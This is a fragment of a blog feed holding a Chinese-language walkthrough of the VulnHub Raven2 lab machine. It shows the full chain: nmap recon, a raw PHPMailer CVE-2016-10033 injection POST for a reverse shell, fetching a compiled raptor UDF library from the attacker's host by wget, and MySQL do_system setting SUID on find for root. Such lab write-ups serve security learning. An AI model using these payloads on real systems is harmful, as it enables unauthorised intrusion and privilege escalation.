      <tags>
        <tag>渗透测试</tag>
        <tag>提权</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Raven2渗透实战]]></title>
    <url>%2F2019%2F08%2F10%2FRaven2%2F</url>
    <content type="text"><![CDATA[前言难度中等，涉及mysql udf提权、phpmailer命令漏洞 渗透信息收集netdiscover -r 192.168.64.0/24 =&gt; 192.168.64.148 nmap -oN nmap.txt -A 192.168.64.148 123456789101112131415161718192021222324PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)| ssh-hostkey: | 1024 26:81:c1:f3:5e:01:ef:93:49:3d:91:1e:ae:8b:3c:fc (DSA)| 2048 31:58:01:19:4d:a2:80:a6:b9:0d:40:98:1c:97:aa:53 (RSA)| 256 1f:77:31:19:de:b0:e1:6d:ca:77:07:76:84:d3:a9:a0 (ECDSA)|_ 256 0e:85:71:a8:a2:c3:08:69:9c:91:c0:3f:84:18:df:ae (ED25519)80/tcp open http Apache httpd 2.4.10 ((Debian))|_http-server-header: Apache/2.4.10 (Debian)|_http-title: Raven Security111/tcp open rpcbind 2-4 (RPC #100000)| rpcinfo: | program version port/proto service| 100000 2,3,4 111/tcp rpcbind| 100000 2,3,4 111/udp rpcbind| 100024 1 48650/tcp status|_ 100024 1 53215/udp statusMAC Address: 00:0C:29:B2:C8:AD (VMware)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Network Distance: 1 hopService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel dirb 192.168.64.148 =&gt; /vendor/ /wordpress/ 其中wordpress无法正常打开，vendor存在目录遍历，并发现phpmailer 5.2.16，存在漏洞 GETSHELLmsf：searchsploit phpmailer 选择python那个脚本，修改exp配置： 修改target为靶机的ip，利用文件为/contact.php 修改后门文件路径，默认的用不了 修改反弹shell的ip与端口 这里当然可以手工利用，抓包并向contact.php文件post数据： 1234567891011121314POST /contact.php HTTP/1.1Host: 192.168.64.148Content-Length: 153Accept: text/html, */*; q=0.01Origin: http://192.168.64.148X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36Content-Type: application/x-www-form-urlencoded; charset=UTF-8Referer: http://192.168.64.148/contact.phpAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: closeaction=submit&amp;name=&lt;?php phpinfo();?&gt;&amp;email="anarcoder\" -OQueueDirectory=/tmp -X/var/www/html/test.php server" @protonmail.com&amp;subject=123&amp;message=Pwned 提交或执行后，在kali上成功获取到反弹的shell，再使用python创建一个虚拟终端： python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot; udf提权发现存在mysql进程，尝试udf提权： 先在kali中下载exp并编译下来： 1234wget https://www.exploit-db.com/download/1518#下载expmv ./1518 ./1518.c gcc -g -c 1518.cgcc -g -shared -o raptor_udf.so 1518.o -lc 在kali下开启Apache服务：/etc/init.d/apache2 start 将编译器下来的raptor_udf.so移动到/html/，在目标服务器/tmp下执行wget http://192.168.64.131:8080/raptor_udf.so 目标服务器下/usr/lib/mysql/plugin中不具备权限，无法直接将文件直接拷贝到该文件夹中，需要进入数据库中操作，在数据库中导入和导出文件： 12345678910111213141516171819202122232425262728293031323334353637mysql&gt; use mysql;mysql&gt; create table foo(data blob);create table foo(data blob);Query OK, 0 rows affected (0.04 sec)mysql&gt; insert into foo values(load_file(&apos;/tmp/raptor_udf.so&apos;));insert into foo values(load_file(&apos;/tmp/raptor_udf.so&apos;));Query OK, 1 row affected (0.02 sec)mysql&gt; select * from foo into dumpfile &apos;/usr/lib/mysql/plugin/raptor_udf.so&apos;;select * from foo into dumpfile &apos;/usr/lib/mysql/plugin/raptor_udf.so&apos;;Query OK, 1 row affected (0.01 sec)mysql&gt; create function do_system returns string soname &apos;raptor_udf.so&apos;;create function do_system returns string soname &apos;raptor_udf.so&apos;;Query OK, 0 rows affected (0.01 sec)mysql&gt; select * from mysql.func;select * from mysql.func;+-----------+-----+---------------+----------+| name | ret | dl | type |+-----------+-----+---------------+----------+| do_system | 0 | raptor_udf.so | function |+-----------+-----+---------------+----------+1 row in set (0.00 sec)mysql&gt; select do_system(&apos;chmod u+s /usr/bin/find&apos;);select do_system(&apos;chmod u+s /usr/bin/find&apos;);+--------------------------------------+| do_system(&apos;chmod u+s /usr/bin/find&apos;) |+--------------------------------------+| NULL |+--------------------------------------+1 row in set (0.01 sec) 命令执行： 123touch foofind foo -exec 'whoami' \;find foo -exec '/bin/sh' \; 参考文章 Web安全 — CVE-2016-10033漏洞（phpmailer任意代码执行） Raven2渗透实战 MySQL 4.x / 5.0（Linux） - 用户定义函数（UDF）动态库]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>提权</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
</search>
